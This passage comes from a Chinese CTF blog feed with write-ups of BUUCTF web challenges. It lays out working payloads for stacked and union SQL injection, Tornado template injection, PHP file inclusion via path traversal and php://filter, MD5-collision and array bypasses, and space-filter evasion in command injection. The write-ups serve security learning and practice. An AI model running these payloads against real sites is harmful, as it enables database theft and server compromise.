&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span><br><span class="line">$s3 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br><span class="line">以上3个的字符串都不相等，但是md5值相等。</span><br></pre></td></tr></table></figure><p>第二种，数组绕过：</p><blockquote><p>  ?gg[]=1&amp;id[]=1</p></blockquote><p>第二个绕过就是简单的在后面加字符就OK</p><blockquote><p>   passwd=1234567a</p></blockquote><h2 id="0x1E-GYCTF2020-Blacklist"><a href="#0x1E-GYCTF2020-Blacklist" class="headerlink" title="0x1E.[GYCTF2020]Blacklist"></a>0x1E.[GYCTF2020]Blacklist</h2><p>有2个字段，但是union select 爆出说不能select，那么堆叠查询。</p><p>show databases;show tables ;show columns from ‘表名’；</p><p>一共有两个表，words，FlagHere</p><p>绕过技巧有3个：</p><p>1）修改表名</p><p>其中words：show columns from words 后是id和data</p><p>而Flag中只有一个flag。</p><p>推测是select id,data from words where id=’$id$‘</p><p>那么：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.将words表名换成其他的名字</span><br><span class="line">2.将FlagHere换成words表名</span><br><span class="line">3.吧flag这个字段换成data</span><br><span class="line">4.再插入一个id字段</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line">alter table words rename to words1;</span><br><span class="line">alter table `FlagHere` rename to words;</span><br><span class="line">alter table words change flag id varchar(50);#</span><br><span class="line"></span><br><span class="line">然后 1&#x27; or 1=1# 将flag打印出来</span><br></pre></td></tr></table></figure><p>2）预编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE name from &#x27;[my sql sequece]&#x27;;   //预定义SQL语句</span><br><span class="line">EXECUTE name;  //执行预定义SQL语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SET @tn = &#x27;hahaha&#x27;;  //存储表名</span><br><span class="line">SET @sql = concat(&#x27;select * from &#x27;, @tn);  //存储SQL语句</span><br><span class="line">PREPARE name from @sql;   //预定义SQL语句</span><br><span class="line">EXECUTE name;  //执行预定义SQL语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句</span><br></pre></td></tr></table></figure><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line">SeT@a=’select * from `FlagHere‘;</span><br><span class="line">prepare execsql from @a;</span><br><span class="line">execute execsql;#</span><br><span class="line">#可以使用16进制绕过</span><br></pre></td></tr></table></figure><p>3）Handler</p><p>但是以上方法在这题失效，因为：</p><blockquote>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure></blockquote><p>可以使用handler查看：</p><blockquote><p>  1’;</p><p>   handler FlagHere open;</p><p>  handler FlagHere read first;#</p></blockquote><h2 id="0x1F-护网杯-2018-easy-tornado"><a href="#0x1F-护网杯-2018-easy-tornado" class="headerlink" title="0x1F.[护网杯 2018]easy_tornado"></a>0x1F.[护网杯 2018]easy_tornado</h2><p>三个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">/welcome.txt</span><br><span class="line">/hints.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line"></span><br><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line"></span><br><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><p>在hints可以看到:</p><blockquote><p>   file?filename=/hints.txt&amp;filehash=3c2c74f529451b2c58f5624ce640dfd5</p><p>  说明还需要filehash</p></blockquote><blockquote><p>  render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p><p>  根据之前打开文件的url参数分析这个就是filehash的值 想获得flag只要我们在url中传入/fllllllllllllag文件和filehash 经过这段代码处理的值即可关键就在这cookie_secret这块,得想办法获得cookie_secret </p><p>  在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p><p>  通过模板注入方式我们可以构造</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到:ab4a6b4a-f87f-449d-9016-1cd76c91c474</p><p>然后通过脚本获取hash</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">cookie_secret = <span class="string">&#x27;ab4a6b4a-f87f-449d-9016-1cd76c91c474&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;/fllllllllllllag&#x27;</span></span><br><span class="line">file_hash = hashlib.md5(filename).hexdigest()</span><br><span class="line">new_filename = cookie_secret + file_hash</span><br><span class="line"><span class="built_in">print</span> hashlib.md5(new_filename).hexdigest()</span><br></pre></td></tr></table></figure><blockquote><p>  file?filename=/fllllllllllllag&amp;filehash=add6c325a3930e0b3a30602d131fa9ea</p></blockquote><p>得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x10-ACTF2020-新生赛-Upload&quot;&gt;&lt;a href=&quot;#0x10-ACTF2020-新生赛-Upload&quot; class=&quot;headerlink&quot; title=&quot;0x10.[ACTF2020 新生赛]Upload&quot;&gt;&lt;/a&gt;0x10.[ACTF202</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>BUU_WEB刷题_0x01-0x0F</title>
    <link href="http://example.com/2021/04/17/BUU-WEB-0x1-0xF/"/>
    <id>http://example.com/2021/04/17/BUU-WEB-0x1-0xF/</id>
    <published>2021-04-16T16:00:00.000Z</published>
    <updated>2021-06-02T02:10:21.958Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="0x1-HCTF-2018-WarmUp"><a href="#0x1-HCTF-2018-WarmUp" class="headerlink" title="0x1.[HCTF 2018]WarmUp"></a>0x1.[HCTF 2018]WarmUp</h2><p>代码审计+文件包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line"><span class="comment">/*这里mb_sustr 是个截断，返回0到mb_strpos之间的内容，而mb_strps 则是查找第一次出现的位置，</span></span><br><span class="line"><span class="comment">所以基本可以理解为获取page 两个？之间的字符串，也就是获取file两个？之间的字符串，放到url中就是http://ip/?file=ddd?中的file=ddd*/</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>?file=source.php?/../../../../ffffllllaaaagggg</code></p><p>或</p><p><code>?file=hint.php?/../../../../ffffllllaaaagggg</code></p><h2 id="0x2-极客大挑战-2019-EasySQL"><a href="#0x2-极客大挑战-2019-EasySQL" class="headerlink" title="0x2.[极客大挑战 2019]EasySQL"></a>0x2.[极客大挑战 2019]EasySQL</h2><p>直接</p><p><code>payload: username=admin&#39; or &#39;1&#39;=&#39;1&amp;password=aaa&#39; or &#39;1&#39;=&#39;1</code></p><p><code>username=admin&amp;password=aa&#39; or &#39;1&#39;=&#39;1</code></p><h2 id="0x3-强网杯-2019-随便注"><a href="#0x3-强网杯-2019-随便注" class="headerlink" title="0x3.[强网杯 2019]随便注"></a>0x3.[强网杯 2019]随便注</h2><p>用union select 时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure><h3 id="1）-堆叠注入："><a href="#1）-堆叠注入：" class="headerlink" title="1）.堆叠注入："></a>1）.堆叠注入：</h3><p>show database;</p><p>show tables;</p><p>查看表结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desc `1919810931114514`--+</span><br><span class="line">注意要用`引起来</span><br><span class="line">或：show colunms from `1919810931114514`</span><br></pre></td></tr></table></figure><p>可以知道，有两个表，words，1919810931114514(这里面有flag)。</p><p>大致查询语句应该为：select id,data from words where id=;</p><p>那么可以将words表改名为aaa，将1919810931114514改为words，再将id改为flag。（偷天换日的感觉）</p><blockquote><p> 0’;rename table words to words1;</p><p> rename table <code>1919810931114514</code> to words;</p><p> alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</p><p> desc  words;#</p></blockquote><h2 id="0x4-极客大挑战-2019-Havefun"><a href="#0x4-极客大挑战-2019-Havefun" class="headerlink" title="0x4.[极客大挑战 2019]Havefun"></a>0x4.[极客大挑战 2019]Havefun</h2><p>看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cat</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">&#x27;dog&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接出flag</p><h2 id="0x5-SUCTF-2019-EasySQL"><a href="#0x5-SUCTF-2019-EasySQL" class="headerlink" title="0x5.[SUCTF 2019]EasySQL"></a>0x5.[SUCTF 2019]EasySQL</h2><p>还是堆叠注入</p><p>show databases;和show tables后就不知道干啥了。。</p><p>后来看了wp：select $_post[query] || flag from flag</p><h3 id="1）正解"><a href="#1）正解" class="headerlink" title="1）正解"></a>1）正解</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>即：selecr 1;sett sql_mode=pips_as_concat;select 1 || flag from flag</p><p><strong>补充</strong>：</p><p>补充系统变量@@sql_mode：是一组mysql支持的基本语法及校验规则<br>PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p><p><a href="https://blog.csdn.net/weixin_42373127/article/details/88866710">Mysql中sql_mode参数</a></p><h3 id="2）非预期解"><a href="#2）非预期解" class="headerlink" title="2）非预期解"></a>2）非预期解</h3><p>构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1 || flag from flag</span><br></pre></td></tr></table></figure><h2 id="0x6-ACTF2020-新生赛-Include"><a href="#0x6-ACTF2020-新生赛-Include" class="headerlink" title="0x6.[ACTF2020 新生赛]Include"></a>0x6.[ACTF2020 新生赛]Include</h2><p>使用php://input 伪协议+POST发送php代码，不行</p><p>使用php://filter伪协议进行包含</p><p>于是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>php://filter与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</p><p>php://filter 伪协议文件包含读取源代码，加上read=convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</p><h2 id="0x7-极客大挑战-2019-Secret-File"><a href="#0x7-极客大挑战-2019-Secret-File" class="headerlink" title="0x7.[极客大挑战 2019]Secret File"></a>0x7.[极客大挑战 2019]Secret File</h2><p>有个action.php的文件，之后抓包访问，有个secr3t.php文件，访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br></pre></td></tr></table></figure><p>可以和上一题一样，php://filter</p><p>payload=?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>解码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;我就在这里&quot;;</span><br><span class="line">                $flag = &#x27;flag&#123;2c021ef6-68a2-4674-bf4d-ca928f144327&#125;&#x27;;</span><br><span class="line">                $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x8-极客大挑战-2019-LoveSQL"><a href="#0x8-极客大挑战-2019-LoveSQL" class="headerlink" title="0x8.[极客大挑战 2019]LoveSQL"></a>0x8.[极客大挑战 2019]LoveSQL</h2><p>不知道为啥，这里只能%23，不能#和–+</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&#x27;%23&amp;password=1</span><br><span class="line"></span><br><span class="line">?username=admin&#x27; order by 3%23&amp;password=1</span><br><span class="line"></span><br><span class="line">?username=111&#x27; union select 1,2,3%23&amp;password=1</span><br><span class="line">是2和3</span><br><span class="line"></span><br><span class="line">?username=111&#x27; union select 1,database(),3%23&amp;password=1</span><br><span class="line">数据库名：geek</span><br><span class="line"></span><br><span class="line">?username=111&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;geek&#x27;%23&amp;password=1</span><br><span class="line">得到可疑表：l0ve1ysq1</span><br><span class="line"></span><br><span class="line">?username=111&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;geek&#x27; and table_name=&#x27;l0ve1ysq1&#x27;%23&amp;password=1</span><br><span class="line">得到字段id,username,password</span><br><span class="line"></span><br><span class="line">?username=111&#x27; union select 1,group_concat(id,username,password),3 from geek.l0ve1ysq1%23&amp;password=1</span><br><span class="line">或者：</span><br><span class="line">?username=111&#x27; union select id,username,password from geek.l0ve1ysq1 limit 0,1%23&amp;password=1</span><br><span class="line">一个一个查</span><br></pre></td></tr></table></figure><h2 id="0x9-ACTF2020-新生赛-Exec"><a href="#0x9-ACTF2020-新生赛-Exec" class="headerlink" title="0x9.[ACTF2020 新生赛]Exec"></a>0x9.[ACTF2020 新生赛]Exec</h2><p>就是连接命令，可以管道符||，也可以分号，或者&amp;这个符号。</p><p>但是经过测试，之后分号可以多个命令一起执行（在这道题）</p><p><img src="/2021/04/17/BUU-WEB-0x1-0xF/image-20210415165001140.png" alt="image-20210415165001140"></p><p>找到flag.</p><h2 id="0xA-GXYCTF2019-Ping-Ping-Ping"><a href="#0xA-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="0xA.[GXYCTF2019]Ping Ping Ping"></a>0xA.[GXYCTF2019]Ping Ping Ping</h2><p>打开后发现无论是cat flag.php还是index.php都打不开，经过测试发现可能是过滤了空格。</p><blockquote><ol><li> ${IFS}替换</li><li> $IFS$1替换</li><li> ${IFS替换</li><li> %20替换</li><li> &lt;和&lt;&gt;重定向符替换</li><li> %09替换</li></ol></blockquote><p>$IFS是shell中的一个变量，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span 